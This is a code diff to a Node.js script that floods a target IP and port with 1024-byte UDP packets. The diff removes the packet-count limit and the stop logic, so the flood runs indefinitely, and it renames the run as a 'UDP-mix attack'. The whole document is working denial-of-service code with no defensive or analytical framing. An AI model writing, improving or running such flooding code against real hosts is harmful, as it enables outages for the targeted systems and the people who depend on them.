@@ -9,7 +9,6 @@ if (process.argv.length < 4) {
 const targetIP = process.argv[2];
 const targetPort = parseInt(process.argv[3]);
 const packetSize = 1024;
-const packetCount = 500000;
 
 const client = dgram.createSocket('udp4');
 const message = Buffer.alloc(packetSize, 'X');
@@ -17,12 +16,6 @@ const message = Buffer.alloc(packetSize, 'X');
 let sentPackets = 0;
 
 function sendPacket() {
-    if (sentPackets >= packetCount) {
-        console.log('Finished sending packets.');
-        client.close();
-        return;
-    }
-
     client.send(message, targetPort, targetIP, (err) => {
         if (err) {
             console.error(`Error sending packet: ${err.message}`);
@@ -34,8 +27,8 @@ function sendPacket() {
         console.log(`Sent ${sentPackets} packets...`);
     }
 
-    setImmediate(sendPacket);
+    setTimeout(sendPacket, 0.0001);
 }
 
-console.log(`Sending ${packetCount} packets to ${targetIP}:${targetPort}...`);
+console.log(`Starting UDP-mix attack on ${targetIP}:${targetPort}...`);
 sendPacket();
